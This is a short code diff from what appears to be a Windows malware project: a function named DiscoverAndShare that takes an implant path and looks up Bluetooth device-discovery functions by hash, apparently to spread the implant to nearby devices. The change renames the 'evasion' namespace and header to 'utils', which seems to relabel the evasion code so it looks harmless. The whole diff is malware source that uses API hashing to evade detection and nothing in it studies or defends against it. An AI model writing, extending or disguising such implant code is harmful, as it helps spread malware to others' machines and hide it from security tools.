@@ -1,6 +1,6 @@
 #include "BluetoothLateral.h"
 #include "../fs/FileSystem.h"
-#include "../evasion/Syscalls.h"
+#include "../utils/Shared.h"
 #include <windows.h>
 #include <bluetoothapis.h>
 #include <ws2bth.h>
@@ -24,9 +24,9 @@ bool DiscoverAndShare(const std::string& implantPath) {
     typedef BOOL (WINAPI *pBluetoothFindNextDevice)(HBLUETOOTH_DEVICE_FIND, BLUETOOTH_DEVICE_INFO*);
     typedef BOOL (WINAPI *pBluetoothFindDeviceClose)(HBLUETOOTH_DEVICE_FIND);
 
-    pBluetoothFindFirstDevice pFindFirst = (pBluetoothFindFirstDevice)evasion::getProcByHash(hBt, evasion::djb2Hash("BluetoothFindFirstDevice"));
-    pBluetoothFindNextDevice pFindNext = (pBluetoothFindNextDevice)evasion::getProcByHash(hBt, evasion::djb2Hash("BluetoothFindNextDevice"));
-    pBluetoothFindDeviceClose pFindClose = (pBluetoothFindDeviceClose)evasion::getProcByHash(hBt, evasion::djb2Hash("BluetoothFindDeviceClose"));
+    pBluetoothFindFirstDevice pFindFirst = (pBluetoothFindFirstDevice)utils::getProcByHash(hBt, utils::djb2Hash("BluetoothFindFirstDevice"));
+    pBluetoothFindNextDevice pFindNext = (pBluetoothFindNextDevice)utils::getProcByHash(hBt, utils::djb2Hash("BluetoothFindNextDevice"));
+    pBluetoothFindDeviceClose pFindClose = (pBluetoothFindDeviceClose)utils::getProcByHash(hBt, utils::djb2Hash("BluetoothFindDeviceClose"));
 
     if (!pFindFirst || !pFindNext || !pFindClose) {
         FreeLibrary(hBt);
